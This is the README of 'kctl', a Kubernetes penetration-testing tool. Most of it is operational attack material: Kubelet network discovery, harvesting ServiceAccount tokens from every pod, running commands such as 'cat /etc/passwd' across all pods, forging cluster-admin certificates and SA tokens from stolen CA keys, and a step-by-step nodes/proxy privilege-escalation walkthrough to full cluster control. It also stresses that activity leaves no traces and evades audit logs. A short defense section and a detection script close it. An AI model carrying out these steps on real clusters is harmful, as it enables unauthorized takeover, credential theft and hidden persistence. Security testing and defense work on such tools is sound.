<p align="center">
  <img src="https://img.shields.io/github/v/release/kinopio1101/kctl?color=%2300ADD8&label=release&logo=github&logoColor=white" alt="GitHub Release">
  <img src="https://img.shields.io/badge/Go-1.24+-00ADD8?logo=go&logoColor=white" alt="Go Version">
  <a href="https://github.com/kinopio1101/kctl/blob/main/LICENSE">
    <img src="https://img.shields.io/badge/License-MIT-E11311.svg" alt="MIT License">
  </a>
  <a href="https://github.com/kinopio1101/kctl/issues">
    <img src="https://img.shields.io/github/issues/kinopio1101/kctl?color=%23F97316&logo=github" alt="GitHub Issues">
  </a>
  <a href="https://github.com/kinopio1101/kctl/stargazers">
    <img src="https://img.shields.io/github/stars/kinopio1101/kctl?color=%23FBBF24&logo=github" alt="GitHub Stars">
  </a>
</p>

<p align="center">
  <a href="./README.md"><img alt="README in English" src="https://img.shields.io/badge/English-d9d9d9"></a>
  <a href="./README.zh-CN.md"><img alt="简体中文版自述文件" src="https://img.shields.io/badge/简体中文-d9d9d9"></a>
</p>

<h1 align="center">
  <br>
  <img src="https://raw.githubusercontent.com/kubernetes/kubernetes/master/logo/logo.svg" alt="kctl" width="120">
  <br>
  kctl
  <br>
</h1>

<h4 align="center">Kubernetes Security Audit Tool - Penetration Testing & Lateral Movement</h4>

<p align="center">
  <a href="#features">Features</a> •
  <a href="#installation">Installation</a> •
  <a href="#quick-start">Quick Start</a> •
  <a href="#modes">Modes</a> •
  <a href="#commands">Commands</a> •
  <a href="#golden-ticket">Golden Ticket</a> •
  <a href="#attack-scenario">Attack Scenario</a> •
  <a href="#defense">Defense</a>
</p>

---

## Overview

**kctl** is a Kubernetes security audit tool designed for penetration testing. It supports two operation modes:

- **Kubelet Mode** - Direct Kubelet API (10250) access for node-level operations
- **Kubernetes Mode** - API Server (6443) operations including Golden Ticket attacks


## Features

| Feature | Mode | Description |
|---------|------|-------------|
| `discover` | Kubelet | Scan network ranges to find Kubelet endpoints |
| `sa scan` | Kubelet | Extract and analyze SA tokens from all Pods |
| `exec` | Kubelet | Execute commands in any Pod via Kubelet API |
| `run` | Kubelet | Execute commands via /run API |
| `portforward` | Kubelet | Port forwarding through Kubelet API |
| `pid2pod` | Kubelet | Map Linux PIDs to Pod metadata |
| `golden` | Kubernetes | Forge certificates and SA tokens (Golden Ticket) |

## Installation

### Download Binary

```bash
# Linux amd64
curl -LO https://github.com/kinokopio/kctl/releases/latest/download/kctl-linux-amd64
chmod +x kctl-linux-amd64
mv kctl-linux-amd64 /usr/local/bin/kctl

# macOS arm64
curl -LO https://github.com/kinokopio/kctl/releases/latest/download/kctl-darwin-arm64
chmod +x kctl-darwin-arm64
mv kctl-darwin-arm64 /usr/local/bin/kctl
```

### Build from Source

```bash
git clone https://github.com/kinokopio/kctl.git
cd kctl
go build -o kctl ./main/main.go
```

## Quick Start

### Basic Usage

```bash
# Enter interactive console
./kctl console

# Specify target
./kctl console -t 10.0.0.1

# Full connection parameters
./kctl console -t 10.0.0.1 -p 10250 --token "eyJ..." --api-server 10.0.0.1 --api-port 6443

# Use SOCKS5 proxy
./kctl console -t 10.0.0.1 --proxy socks5://127.0.0.1:1080
```

### Auto-Detection in Pod

When running inside a Pod, kctl automatically:
1. Detects Kubelet IP (default gateway)
2. Reads ServiceAccount token
3. Connects to Kubelet
4. Checks current SA permissions

```
$ ./kctl console

    ██╗  ██╗ ██████╗████████╗██╗
    ██║ ██╔╝██╔════╝╚══██╔══╝██║
    █████╔╝ ██║        ██║   ██║
    ██╔═██╗ ██║        ██║   ██║
    ██║  ██╗╚██████╗   ██║   ███████╗
    ╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚══════╝

  Kubernetes Security Audit Tool

  [*] Mode: kubelet (In-Pod)
  [*] Kubelet: 10.244.1.1:10250 (auto-detected)
  [*] Type 'help' for available commands

[*] Auto-connecting to Kubelet 10.244.1.1:10250...
✓ Connected successfully
[+] Using ServiceAccount: default/attacker
[*] Checking permissions...
[+] Risk Level: CRITICAL

kctl [kubelet:10.244.1.1:10250 default/attacker CRITICAL]>
```

## Modes

kctl operates in two modes with different command sets:

### Kubelet Mode (Default)

For direct Kubelet API operations on a single node:

```
kctl [kubelet:10.0.0.1:10250]> help

  Available Commands [kubelet]

  Connection:
    connect      Connect to Kubelet
    discover     Scan network to find Kubelet nodes

  Information:
    pods         List Pods on the node
    sa           ServiceAccount operations

  Execution:
    exec         Execute command (WebSocket)
    run          Execute command (/run API)
    portforward  Port forwarding
    pid2pod      Map PIDs to Pods
```

### Kubernetes Mode

For API Server operations including Golden Ticket attacks:

```
kctl [kubelet]> mode kubernetes
[+] Switched to kubernetes mode

kctl [kubernetes:127.0.0.1:6443]> help

  Available Commands [kubernetes]

  Golden Ticket:
    golden       Forge certificates and SA tokens

  Configuration:
    set          Set configuration
    show         Show information
```

Switch modes with `mode kubelet` or `mode kubernetes`.

## Golden Ticket

The Golden Ticket feature allows forging Kubernetes certificates and ServiceAccount tokens for persistence after compromising cluster CA keys.

### Prerequisites

To use Golden Ticket, you need access to:
- **CA certificate and private key** (`ca.crt`, `ca.key`) - for forging user/node certificates
- **SA signing key** (`sa.key`) - for forging ServiceAccount tokens

These files are typically found on control plane nodes at `/etc/kubernetes/pki/`.

### Forge User Certificate (cluster-admin)

```bash
# Switch to kubernetes mode
kctl> mode kubernetes

# Set API Server
kctl [kubernetes]> set api-server 10.0.0.1
kctl [kubernetes]> set api-port 6443

# Forge admin certificate
kctl [kubernetes:10.0.0.1:6443]> golden user-cert --ca-cert ca.crt --ca-key ca.key --role system:masters --user admin

[*] Using API Server: https://10.0.0.1:6443
[*] Creating user certificate (system:masters/admin)...

[+] Successfully created user certificate!

  Certificate: system-masters_admin.crt
  Private key: system-masters_admin.key
  Kubeconfig:  kubeconfig_system-masters_admin

  Test with: kubectl --kubeconfig=kubeconfig_system-masters_admin auth whoami

[*] Identity: admin (role: system:masters)
[*] Expires at: 2027-02-10 16:30:19
```

### Forge ServiceAccount Token

```bash
# First, fetch UID cache from API Server
kctl [kubernetes:10.0.0.1:6443]> golden update-uid --ca-cert ca.crt --ca-key ca.key

[*] Using API Server: https://10.0.0.1:6443
[*] Creating temporary admin certificate...
[*] Requesting ServiceAccount list...

[+] Received 45 ServiceAccounts
[+] UID cache saved to memory

# List cached UIDs
kctl [kubernetes:10.0.0.1:6443]> golden uid-list
kctl [kubernetes:10.0.0.1:6443]> golden uid-list -n kube-system

# Forge token (UID auto-lookup from memory)
kctl [kubernetes:10.0.0.1:6443]> golden sa-token --sa-key sa.key --namespace kube-system --name default

[+] Found UID in memory cache: a1b2c3d4-...
[*] Forging ServiceAccount token (TTL: 3600s)...

[+] Forged ServiceAccount token for kube-system/default:

  Token: eyJhbGciOiJSUzI1NiIs...

[+] Kubeconfig: kubeconfig_kube-system_default
```

### Golden Ticket Subcommands

| Command | Description |
|---------|-------------|
| `golden user-cert` | Forge user certificate (e.g., cluster-admin) |
| `golden node-cert` | Forge node certificate (impersonate kubelet) |
| `golden sa-token` | Forge ServiceAccount JWT token |
| `golden update-uid` | Fetch SA UIDs from API Server to memory |
| `golden uid-list` | List cached UIDs |
| `golden test` | Validate key files |

## Commands

### Common Commands (All Modes)

| Command | Description |
|---------|-------------|
| `help` | Show help information |
| `mode` | View or switch operation mode |
| `set <key> <value>` | Set configuration |
| `show options` | Show current configuration |
| `show status` | Show session status |
| `export json/csv` | Export scan results |
| `clear` | Clear cache |
| `exit` | Exit console |

### Kubelet Mode Commands

| Command | Description |
|---------|-------------|
| `discover <target>` | Scan network range for Kubelet nodes |
| `connect [ip]` | Connect to Kubelet |
| `pods` | List Pods on the node |
| `sa scan` | Scan all Pod SA tokens |
| `sa list` | List scanned ServiceAccounts |
| `sa use <ns/name>` | Switch to specified SA |
| `sa info` | Show current SA details |
| `exec` | Execute command in Pod (WebSocket) |
| `run` | Execute command in Pod (/run API) |
| `portforward` | Port forwarding to Pod |
| `pid2pod` | Map PIDs to Pods (in-Pod only) |

### Kubernetes Mode Commands

| Command | Description |
|---------|-------------|
| `golden user-cert` | Forge user certificate |
| `golden node-cert` | Forge node certificate |
| `golden sa-token` | Forge ServiceAccount token |
| `golden update-uid` | Fetch SA UIDs to memory |
| `golden uid-list` | List cached UIDs |
| `golden test` | Validate key files |

### Network Discovery

```bash
# Scan CIDR range
discover 10.0.0.0/24

# Scan IP range
discover 10.0.0.1-254

# Custom ports and concurrency
discover 10.0.0.0/24 -p 10250,10255 -c 200

# Show all open ports (not just Kubelet)
discover 10.0.0.0/24 --all
```

Output example:
```
[*] Scanning 10.0.0.0/24:10250 (254 targets, 100 concurrent)
[========================================] 100% (254/254)
[*] Validating Kubelet endpoints...

+-------------+-------+------------+
| IP          | PORT  | HEALTH     |
+-------------+-------+------------+
| 10.0.0.1    | 10250 | /healthz   |
| 10.0.0.5    | 10250 | /healthz   |
+-------------+-------+------------+

[+] Scan complete in 3.2s: 3 open ports, 2 Kubelet nodes
[*] Use 'set target <ip>' to select target
[*] Use 'show kubelets' to view cached results
```

### ServiceAccount Operations

```bash
# List all SAs (default)
sa

# List risky SAs only
sa list --risky

# List cluster-admin only
sa list --admin

# Scan all Pod SA tokens
sa scan

# Select SA
sa use kube-system/cluster-admin

# Show current SA details
sa info
```

### Command Execution

```bash
# Interactive shell (WebSocket)
exec -it nginx-pod

# Execute command in specific Pod
exec nginx-pod -- cat /etc/passwd

# Execute across all Pods
exec --all-pods -- whoami

# Execute with filters
exec --all-pods --filter-ns kube-system -- id

# Use /run API (simpler, no WebSocket)
run nginx-pod --cmd "cat /etc/passwd"

# Run across all Pods
run --all-pods --cmd "hostname"
```

### Port Forwarding

```bash
# Forward local port 8080 to Pod port 80
portforward nginx-pod 8080:80

# Forward with custom listen address
portforward nginx-pod 8080:80 --address 0.0.0.0

# Stop port forwarding
pf stop
```

### PID to Pod Mapping (In-Pod Only)

```bash
# Show all container processes with Pod info
pid2pod

# Look up specific PID
pid2pod --pid 1234

# Show all processes including non-container
pid2pod --all
```

### Typical Workflow (Kubelet Mode)

```bash
# 1. Scan network to discover Kubelet nodes
kctl [kubelet]> discover 10.0.0.0/24

# 2. Select target
kctl [kubelet]> set target 10.0.0.5

# 3. Scan SA permissions on all Pods
kctl [kubelet:10.0.0.5:10250]> sa scan

# 4. View high-privilege SAs
kctl [kubelet:10.0.0.5:10250]> sa list --admin

# 5. Switch to high-privilege SA
kctl [kubelet:10.0.0.5:10250]> sa use kube-system/cluster-admin

# 6. Execute commands with new identity
kctl [kubelet:10.0.0.5:10250 kube-system/cluster-admin ADMIN]> exec -it
```

### Typical Workflow (Golden Ticket)

```bash
# 1. Switch to kubernetes mode
kctl [kubelet]> mode kubernetes

# 2. Set API Server
kctl [kubernetes]> set api-server 10.0.0.1
kctl [kubernetes]> set api-port 6443

# 3. Forge admin certificate (requires ca.crt and ca.key)
kctl [kubernetes:10.0.0.1:6443]> golden user-cert -c ca.crt -k ca.key --role system:masters

# 4. Test the forged certificate
$ kubectl --kubeconfig=kubeconfig_system-masters_kubernetes-admin get nodes

# 5. For SA token forgery, first fetch UIDs
kctl [kubernetes:10.0.0.1:6443]> golden update-uid -c ca.crt -k ca.key

# 6. Forge SA token (requires sa.key)
kctl [kubernetes:10.0.0.1:6443]> golden sa-token -s sa.key --namespace kube-system --name default
```

## Attack Scenario

### nodes/proxy Privilege Escalation

#### Background

The `nodes/proxy GET` permission is commonly granted to monitoring tools (Prometheus, Datadog, Grafana) for collecting metrics.

Based on [Graham Helton's research](https://grahamhelton.com/blog/nodes-proxy-rce), due to Kubelet's authorization flaw with WebSocket connections, `nodes/proxy GET` can be used to execute commands in any Pod.

#### Vulnerability Mechanism

1. WebSocket protocol requires HTTP GET for initial handshake
2. Kubelet performs authorization check based on initial HTTP method (GET)
3. After authorization passes, WebSocket connection can access `/exec` endpoint to execute commands
4. This bypasses the `nodes/proxy CREATE` permission that should be required

#### Privilege Escalation with kctl

##### Scenario Setup

Assume you have access to a Pod whose ServiceAccount has `nodes/proxy GET` permission:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: nodes-proxy-reader
rules:
  - apiGroups: [""]
    resources: ["nodes/proxy"]
    verbs: ["get"]
```

##### Step 1: Enter Console and Check Permissions

```bash
# Copy kctl to target Pod
kubectl cp kctl-linux-amd64 attacker:/kctl

# Enter Pod
kubectl exec -it attacker -- /bin/sh

# Run kctl
/kctl console
```

```
[*] Auto-connecting to Kubelet 10.244.1.1:10250...
✓ Connected successfully
[+] Using ServiceAccount: default/attacker
[*] Checking permissions...
[+] Risk Level: HIGH

kctl [kubelet:10.244.1.1:10250 default/attacker HIGH]>
```

##### Step 2: View Current Permissions

```
kctl [kubelet:10.244.1.1:10250 default/attacker HIGH]> sa info

  ServiceAccount Information
  ─────────────────────────────────────────
  Name            : attacker
  Namespace       : default
  Risk Level      : HIGH
  Token Status    : Valid

  Permissions:
    - nodes/proxy:get        <- Key permission!
    - nodes:list
    - pods:list
```

##### Step 3: Scan All Pods on the Node

```
kctl [kubelet:10.244.1.1:10250 default/attacker HIGH]> sa scan

[*] Scanning ServiceAccount tokens...
[*] Found 15 pods with SA tokens
[*] Checking permissions... (3 concurrent)

RISK     NAMESPACE      POD                    SERVICE ACCOUNT      TOKEN    FLAGS
─────────────────────────────────────────────────────────────────────────────────
ADMIN    kube-system    kube-proxy-xxxxx       kube-proxy           Valid    -
ADMIN    kube-system    coredns-xxxxx          coredns              Valid    -
HIGH     monitoring     prometheus-xxxxx       prometheus           Valid    -
...

[+] Scan complete: 15 SAs, 2 ADMIN, 1 CRITICAL, 3 HIGH
```

##### Step 4: Execute Commands via nodes/proxy

Since we have `nodes/proxy GET` permission, we can execute commands in any Pod via Kubelet API:

```
kctl [kubelet:10.244.1.1:10250 default/attacker HIGH]> pods

NAMESPACE      POD                         STATUS    CONTAINERS
───────────────────────────────────────────────────────────────
kube-system    etcd-master                 Running   etcd
kube-system    kube-apiserver-master       Running   kube-apiserver
kube-system    kube-proxy-xxxxx            Running   kube-proxy
default        nginx                       Running   nginx
...
```

```
kctl [kubelet:10.244.1.1:10250 default/attacker HIGH]> exec -n kube-system kube-proxy-xxxxx -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

This returns the `kube-proxy` ServiceAccount token, which typically has cluster-admin privileges!

##### Step 5: Switch to High-Privilege Identity

```
kctl [kubelet:10.244.1.1:10250 default/attacker HIGH]> sa use kube-system/kube-proxy

[+] Switched to kube-system/kube-proxy
[*] Checking permissions...
[!] Risk Level: ADMIN (cluster-admin)

kctl [kubelet:10.244.1.1:10250 kube-system/kube-proxy ADMIN]>
```

##### Step 6: Full Cluster Control

Now you have cluster-admin privileges and can fully control the cluster with this token.

#### Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                 nodes/proxy GET Privilege Escalation            │
└─────────────────────────────────────────────────────────────────┘

┌──────────────┐     ┌──────────────┐     ┌──────────────────────┐
│ Initial      │     │ Permission   │     │ Lateral Movement     │
│ Access       │     │ Discovery    │     │                      │
│              │────>│              │────>│ Execute commands in  │
│ Compromised  │     │ nodes/proxy  │     │ other Pods via       │
│ Pod          │     │ GET found    │     │ Kubelet API          │
└──────────────┘     └──────────────┘     └──────────────────────┘
                                                    │
                                                    v
┌──────────────┐     ┌──────────────┐     ┌──────────────────────┐
│ Full Cluster │     │ Privilege    │     │ Token Theft          │
│ Control      │     │ Escalation   │     │                      │
│              │<────│              │<────│ Read system Pod      │
│ cluster-admin│     │ Use high-    │     │ SA tokens            │
│ access       │     │ priv token   │     │                      │
└──────────────┘     └──────────────┘     └──────────────────────┘
```

## Risk Levels

| Level | Description | Example Permissions |
|-------|-------------|---------------------|
| ADMIN | Cluster administrator | `*/*`, cluster-admin |
| CRITICAL | Direct privilege escalation | `secrets:create`, `pods/exec:create` |
| HIGH | Sensitive data exposure | `secrets:get`, `nodes/proxy:get` |
| MEDIUM | Potential abuse | `pods:create`, `configmaps:get` |
| LOW | Low risk | `pods:list`, `services:get` |
| NONE | No risk | Read-only basic permissions |

## Defense

### Recommendations

1. **Avoid nodes/proxy permissions** - Use KEP-2862 fine-grained permissions (`nodes/metrics`, `nodes/stats`)
2. **Network isolation** - Restrict access to Kubelet port (10250)
3. **Audit logging** - Note: Direct Kubelet API access bypasses K8s audit logs
4. **Least privilege** - Regularly review ServiceAccount permissions

### Detection Script

Check for ServiceAccounts with `nodes/proxy` permission:

```bash
kubectl get clusterrolebindings -o json | jq -r '
  .items[] | 
  select(.roleRef.kind == "ClusterRole") |
  .metadata.name as $binding |
  .roleRef.name as $role |
  .subjects[]? |
  "\($binding) -> \($role) -> \(.kind)/\(.namespace)/\(.name)"
' | while read line; do
  role=$(echo $line | cut -d'>' -f2 | tr -d ' ')
  kubectl get clusterrole $role -o json 2>/dev/null | \
    jq -e '.rules[] | select(.resources[] | contains("nodes/proxy"))' >/dev/null && \
    echo "[!] $line"
done
```

## Disclaimer

- This tool is intended for **authorized security assessments and penetration testing only**
- Ensure you have proper authorization before use
- All operations are performed in memory, leaving no traces after exit
- Direct Kubelet API access is **not recorded** in Kubernetes audit logs
- Golden Ticket attacks require prior access to cluster CA/SA keys

## References

- [Kubernetes RCE Via Nodes/Proxy GET Permission](https://grahamhelton.com/blog/nodes-proxy-rce)
- [k8s_spoofilizer - Kubernetes Golden Ticket](https://github.com/jtesta/k8s_spoofilizer)
- [KEP-2862: Fine-Grained Kubelet API Authorization](https://github.com/kubernetes/enhancements/blob/master/keps/sig-node/2862-fine-grained-kubelet-authz/README.md)
- [Kubelet Authentication/Authorization](https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/)

## License

[MIT License](LICENSE)
